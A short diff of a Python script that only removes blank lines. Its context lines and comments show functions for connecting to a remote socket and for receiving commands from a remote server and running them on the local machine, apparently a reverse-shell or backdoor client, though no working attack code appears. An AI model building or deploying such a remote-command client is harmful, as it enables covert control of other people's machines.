@@ -16,7 +16,6 @@ def socket_create():
         s.close()
         sys.exit()
 
-
 # Connect to a remote socket
 def socket_connect():
     try:
@@ -28,8 +27,6 @@ def socket_connect():
         connect.close()
         s.close()
         sys.exit()
-
-
 
 # Receive commands from remote server and run on local machine
 def receive_commands():
